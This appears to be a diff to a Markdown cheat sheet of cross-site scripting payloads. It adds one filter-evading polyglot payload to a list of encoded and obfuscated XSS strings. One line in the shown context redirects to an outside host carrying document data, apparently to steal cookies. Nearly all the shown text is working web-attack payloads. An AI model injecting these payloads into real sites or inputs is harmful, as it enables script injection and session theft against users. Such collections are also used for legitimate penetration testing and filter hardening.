@@ -116,6 +116,7 @@ java%0dscrip%0d%1b%1bt:console.log`${location=`https://www.pudim. com?c=${docume
 <sc%00ript>confirm(1)</script>
 \"><iframe/src=javascript:alert%26%23x000000028%3b)>
 \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/*+*/oNcliCk=alert()+)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 
 ## XSS + SSRF <br>
